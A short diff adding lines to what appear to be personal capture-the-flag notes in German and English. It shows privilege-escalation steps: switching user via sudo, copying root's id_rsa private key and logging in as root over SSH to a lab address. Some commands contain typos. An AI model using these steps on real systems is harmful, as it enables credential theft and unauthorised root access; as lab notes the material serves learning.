@@ -113,6 +113,13 @@ sudo -i
 cd /
 find .-name imroot.txt
 cat path/imroot.txt
+Alternative:
+sudo -l
+sudo -u user2 /bin/bash
+root über ssh files
+kopiere den Inhalt der id_rsa aus dem root Verzeichnis
+und erzeuge ein neues file mit der Berechtigung chmod 600 id_rsa
+ssh root@192.168.178.1 -p 50706-i id_rsa
 
 #010 Malware  ~~
 ELF file use Detect It Easy (DIE)
